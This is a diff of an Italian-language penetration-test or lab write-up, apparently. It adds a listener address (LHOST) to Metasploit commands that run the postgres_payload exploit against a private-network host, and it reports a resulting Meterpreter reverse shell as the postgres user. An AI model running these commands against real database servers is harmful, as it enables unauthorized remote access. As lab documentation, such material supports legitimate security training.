@@ -29,6 +29,7 @@ Per ottenere una sessione Meterpreter:
 msfconsole
 use exploit/linux/postgres/postgres_payload
 set RHOSTS 192.168.50.3
+set LHOST 192.168.50.2
 exploit
 ```
 - **Risultato:** Abbiamo ottenuto una sessione Meterpreter come utente **postgres**.
